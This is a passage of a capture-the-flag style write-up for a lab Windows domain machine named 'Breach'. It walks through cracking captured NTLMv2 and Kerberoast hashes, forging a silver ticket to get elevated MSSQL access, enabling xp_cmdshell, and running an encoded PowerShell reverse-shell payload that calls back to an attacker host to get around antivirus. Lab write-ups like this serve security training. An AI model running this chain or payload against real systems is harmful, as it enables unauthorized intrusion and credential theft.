+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : Julia.Wong::BREACH:944eb9e9f43e1dd2:D49DE050C3F4525E8B379E57E5064EA7:01010000000000000039C8CBB639DC019B2CD8CA95C052A900000000020008004A0041005300470001001E00570049004E002D004300460032003300430056005000580036004500500004003400570049004E002D00430046003200330043005600500058003600450050002E004A004100530047002E004C004F00430041004C00030014004A004100530047002E004C004F00430041004C00050014004A004100530047002E004C004F00430041004C00070008000039C8CBB639DC01060004000200000008003000300000000000000001000000002000007698A398C70DDDE7F165AED6A20492E8F09329AE304EEF9DD622AEE223575F3F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0037002E003100340039000000000000000000
+</span></span></code></pre></div><p>We got a hash for the user <code>julia.wong</code>, we used john to crack it</p>
+<p>Now lets enumerate our user:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;julia.wong&#39;</span> //breach.vl/share
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\j</span>ulia.wong<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:27:41 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  ..                                DHS        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 15:38:00 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  beejay.lnk                          A      <span style="color:#ae81ff">946</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:26:22 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  finance                             D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:19:34 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  software                            D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:19:12 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  transfer                            D        <span style="color:#ae81ff">0</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:26:57 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">7863807</span> blocks of size 4096. <span style="color:#ae81ff">2618345</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd transfer<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\t</span>ransfer<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:26:57 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:27:41 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  beejay.lnk                          A      <span style="color:#ae81ff">946</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:26:57 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  claire.pope                         D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:21:35 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  diana.pope                          D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:21:19 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  julia.wong                          D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:24:39 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">7863807</span> blocks of size 4096. <span style="color:#ae81ff">2617763</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\t</span>ransfer<span style="color:#ae81ff">\&gt;</span> cd julia.wong<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\t</span>ransfer<span style="color:#ae81ff">\j</span>ulia.wong<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:24:39 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Oct <span style="color:#ae81ff">10</span> 07:26:57 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>  local.txt                           A       <span style="color:#ae81ff">36</span>  Thu Feb <span style="color:#ae81ff">17</span> 11:25:02 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">7863807</span> blocks of size 4096. <span style="color:#ae81ff">2614416</span> blocks available
+</span></span></code></pre></div><p>You&rsquo;ll find this user has access to the same shares as before, but we can use her credentials to access her personal directory in the user share, gaining the user flag</p>
+<p>lets see if we can access mssql:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-mssqlclient julia.wong:<span style="color:#e6db74">&#39;Computer1&#39;</span>@10.10.81.20 -windows-auth
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\J</span>ulia.Wong  guest@master<span style="color:#f92672">)</span>&gt; SELECT name FROM master..sysdatabases;
+</span></span><span style="display:flex;"><span>name     
+</span></span><span style="display:flex;"><span>------   
+</span></span><span style="display:flex;"><span>master   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tempdb   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msdb    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\J</span>ulia.Wong  guest@master<span style="color:#f92672">)</span>&gt; enable_xp_cmdshell
+</span></span><span style="display:flex;"><span>ERROR<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 105: User does not have permission to perform this action.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\J</span>ulia.Wong  guest@master<span style="color:#f92672">)</span>&gt; enum_logins
+</span></span><span style="display:flex;"><span>name            type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+</span></span><span style="display:flex;"><span>-------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+</span></span><span style="display:flex;"><span>sa              SQL_LOGIN                 <span style="color:#ae81ff">1</span>          <span style="color:#ae81ff">1</span>               <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>              <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers   WINDOWS_GROUP             <span style="color:#ae81ff">0</span>          <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">0</span>              <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>           <span style="color:#ae81ff">0</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\J</span>ulia.Wong  guest@master<span style="color:#f92672">)</span>&gt; enum_impersonate
+</span></span><span style="display:flex;"><span>execute as   database   permission_name   state_desc   grantee   grantor   
+</span></span><span style="display:flex;"><span>----------   --------   ---------------   ----------   -------   ------- 
+</span></span></code></pre></div><p>Nothing useful for us since we cant enable xp_cmdshell and nothing useful in the file system when enumerating xp_dirtree..</p>
+<p>Lets run bloodhound and see if our user can do anything special:</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="Nmap Results" src="/img/writeups/vulnlab-breach/bloodhound.png">
+
+  
+</figure>
+</p>
+<p>our user doesnt have any outbound permissions, but there is a kerberoastable user - svc_mssql - perhaps we can kerberoast this user and then use it to elevate our privileges within mssql, lets try.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 10.10.81.20 <span style="color:#e6db74">&#39;breach.vl/julia.wong:Computer1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$373a843a60378b2d5b0a7915d6c4d90e$8fa569e98bd9e10ee16988c20176da774f8d8e0b20740bb279d41b073978644355894dc2e78dfcf5de3a25c19c129866657fdf5db54440ce1129fec7bfb2e6076420b702bdbd9dc07c1f9623c39291016d50bc4a6892e6bd365507d53a7c2aff4d7bb0c6436bb8fa5a8646354b5aed16d18dbc72637f0938d5e23ea05ce6e33f3df2beaca41f4081fa794b6bd2f94a22c8f081a51a00c6f5fa9c7a0bf6fa58583b17c0ee32b36cff246c35269399ddbee5777ab8ed042b421a1e56d627f69a464bfb835dc810ae6fa97d9886b856d217800fde774e1c2b8cc42c94e8520394dc6ff1a5f3fa17f9ea986b16759f776a2fb7ba7c10c6be200c1518ff77240d1f311765f2937143b988e7ddd410731f33e323233fbafefe0ac98078db3878cdeea18014827757932f44b0a08715eb4fbcbcb40f70105b05a531b13265fd52fed95d37a5e38591545e0f48d047e2f7e14101b9c1885965971871b96cda5c134ca02171f6c9df76869bc2fb94409043ade4a06a7074e35ea7bb0816ee83fbc318cbb2b7f58d1963d6c9092ec2a6370be1dda3b53b3f5aa2ad45346bf12e1fe41d74907a7523db03a282f718d24ccb74ea1d7aa975fb14c42f5a1a89ca5eceb0d4d6e5f601e785957ef3d322f6b031a3db8510f1c1858621750aeae677606a479e93113ed04fa5902344f5898e3ff72efadf4869ebff040d9a237c0908817eccbd5a7f3811df9e5705f59cacb43999150f790e3cc5bfbf3f6f41c1604ad75f9e026f2749614e9a090acd36e602d379b0109d12d1edd2cc395b6f6aa5fc0ae6453455a13351df33c0e53e55d0d578f4c52dddb09aad7d242b7eeebeeedd4b1dfc38b7bf5e78c5960bd9bc0eef72cbab88daac51ffd6f7809012072214ad7984c945b5c9d43ea06375adb4cebf11661884108928036cdeb668118465733336e7e9fd8463c3acf316ae74a02d01301102d88efdba4c9a0ea75ab6fd8a4c6d7ebff416fd5097019bb43ca316e08799305e4087a5b8b51d9f7db43e43ba2463758a7fff22c217a32a231f20946d127ac3a8d4b4860b2120f04c9d9e66b1dc914c336ae8d00883a30b3478d28a2b945df5cad20865b2cab42659b38bfcbf792c4122b954e6679bddb8785a72ce6559b5cdde82b7bddbf475a91ccb70372422ab32b6215a635c456592115f860fce350dd4b7bdee7a247898953b3d2212d222f836ee3ce3c75441960186d93ae976792a5bc3a7fa2a005b31aad3a95c050a6d0749e78d54e373e2d4e2760641b536b63fee61d30cae8a3cb33d451d073b585a698bca4d64e984c6c6a6479c02c5192a7521b4322efd71dca4ce9fc6ea29eaaa9c5b96e6f215a6f32ef4f34339c6e028de786a8e3003ae0b78883f6be753c5aad027b138c24867c2be3c40ea3e3e2c4ac6dd1c90d195145ea39c316b2c753554d9dcb4900f1e5612e57aa0cdaab1a5b3aefd345c81d0246c6d190f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*crack*
+</span></span><span style="display:flex;"><span>john hash1.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt 
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5tgs, Kerberos <span style="color:#ae81ff">5</span> TGS etype <span style="color:#ae81ff">23</span> <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>Trustno1         <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2025-10-10 07:46<span style="color:#f92672">)</span> 10.00g/s 522240p/s 522240c/s 522240C/s patitos..lili12
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>now we own the user svc_mssql, lets see if we have xp_cmdshell access within mssql:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\s</span>vc_mssql  guest@master<span style="color:#f92672">)</span>&gt; enable_xp_cmdshell
+</span></span><span style="display:flex;"><span>ERROR<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 105: User does not have permission to perform this action.
+</span></span><span style="display:flex;"><span>ERROR<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: You <span style="color:#66d9ef">do</span> not have permission to run the RECONFIGURE statement.
+</span></span><span style="display:flex;"><span>ERROR<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 62: The configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> does not exist, or it may be an advanced option.
+</span></span><span style="display:flex;"><span>ERROR<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: You <span style="color:#66d9ef">do</span> not have permission to run the RECONFIGURE statement.
+</span></span></code></pre></div><p>Hmm, okay. we can try something i have recently learned: a silver ticket attack.</p>
+<p>A Silver Ticket Attack is a Kerberos-based attack where an attacker forges a service ticket (TGS) instead of the TGT (Ticket Granting Ticket). This allows unauthorized access to a specific service without needing to communicate with the Domain Controller (KDC). Since Silver Tickets are generated offline and don’t require KDC validation, they can be harder to detect compared to Golden Ticket Attacks. After forging the Silver Ticket, we pass it to the target service, which gives us elevated access. From there, we’ll execute MSSQL commands with higher permissions — and finally, drop a reverse shell.</p>
+<p>For this we will need to get the NTLM hash of our user, since we have the password already, this step is easy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;Trustno1&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span><span style="display:flex;"><span>MD4<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)=</span> 69596c7aa1e8daee17f8e78870e25a5c
+</span></span></code></pre></div><p>Then, get the ticket: (the spn i used was the one set for the user itself, can check in bloodhound)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-ticketer -nthash <span style="color:#e6db74">&#39;69596c7aa1e8daee17f8e78870e25a5c&#39;</span> -domain-sid <span style="color:#e6db74">&#39;S-1-5-21-2330692793-3312915120-706255856&#39;</span> -domain <span style="color:#e6db74">&#39;breach.vl&#39;</span> -spn <span style="color:#e6db74">&#39;MSSQLSvc/breachdc.breach.vl:1433&#39;</span> <span style="color:#e6db74">&#39;svc_mssql&#39;</span>
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> breach.vl/svc_mssql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     PAC_LOGON_INFO
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     PAC_CLIENT_INFO_TYPE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     EncTicketPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     EncTGSRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     PAC_SERVER_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     PAC_PRIVSVR_CHECKSUM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     EncTicketPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     EncTGSRepPart
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in svc_mssql.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>svc_mssql.ccache                 
+</span></span><span style="display:flex;"><span>                                                                                              
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/vulnlab/machines/breach<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ klist 
+</span></span><span style="display:flex;"><span>Ticket cache: FILE:svc_mssql.ccache
+</span></span><span style="display:flex;"><span>Default principal: svc_mssql@BREACH.VL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Valid starting       Expires              Service principal
+</span></span><span style="display:flex;"><span>10/10/2025 08:47:34  10/08/2035 08:47:34  MSSQLSvc/breachdc.breach.vl:1433@BREACH.VL
+</span></span><span style="display:flex;"><span>        renew <span style="color:#66d9ef">until</span> 10/08/2035 08:47:34
+</span></span></code></pre></div><p>Now lets use the ticket to access mssql, and it should be elevated</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-mssqlclient -no-pass -k breach.vl/svc_mssql@breachdc.breach.vl
+</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; enable_xp_cmdshell
+</span></span><span style="display:flex;"><span>INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>INFO<span style="color:#f92672">(</span>BREACHDC<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>BREACH<span style="color:#ae81ff">\A</span>dministrator  dbo@master<span style="color:#f92672">)</span>&gt; xp_cmdshell whoami
+</span></span><span style="display:flex;"><span>output             
+</span></span><span style="display:flex;"><span>----------------   
+</span></span><span style="display:flex;"><span>breach<span style="color:#ae81ff">\s</span>vc_mssql
+</span></span></code></pre></div><p>Okay for the most annoying part of this box, bypassing the obnoxious AV that was present on it&hellip;</p>
+<p>I tried many payloads with xp_cmdshell, the only one or the first one that worked for me was using <a
+  href="https://github.com/t3l3machus/hoaxshell"
+    target="_blank"
+  >Hoaxshell</a> to get a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hoaxshell -s 10.8.7.149 -p <span style="color:#ae81ff">4444</span> -H <span style="color:#e6db74">&#34;Authorization&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ┬ ┬ ┌─┐ ┌─┐ ─┐ ┬ ┌─┐ ┬ ┬ ┌─┐ ┬   ┬  
+</span></span><span style="display:flex;"><span>    ├─┤ │ │ ├─┤ ┌┴┬┘ └─┐ ├─┤ ├┤  │   │                                                        
+</span></span><span style="display:flex;"><span>    ┴ ┴ └─┘ ┴ ┴ ┴ └─ └─┘ ┴ ┴ └─┘ ┴─┘ ┴─┘                                                      
+</span></span><span style="display:flex;"><span>                           by t3l3machus                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Info<span style="color:#f92672">]</span> Generating reverse shell payload...
+</span></span><span style="display:flex;"><span>powershell -e JABzAD0AJwAxADAALgA4AC4ANwAuADEANAA5ADoANAA0ADQANAAnADsAJABpAD0AJwA5ADEAMQBjADkANwBhADgALQAwADYANgAyADIAOQAxADgALQAwADcANAAzAGEAOAAxADkAJwA7ACQAcAA9ACcAaAB0AHQAcAA6AC8ALwAnADsAJAB2AD0ASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AOQAxADEAYwA5ADcAYQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwAwADYANgAyADIAOQAxADgAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABwACQAcwAvADAANwA0ADMAYQA4ADEAOQAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A            
+</span></span><span style="display:flex;"><span>Copied to clipboard!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Info<span style="color:#f92672">]</span> Type <span style="color:#e6db74">&#34;help&#34;</span> to get a list of the available prompt commands.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Info<span style="color:#f92672">]</span> Http Server started on port 4444.
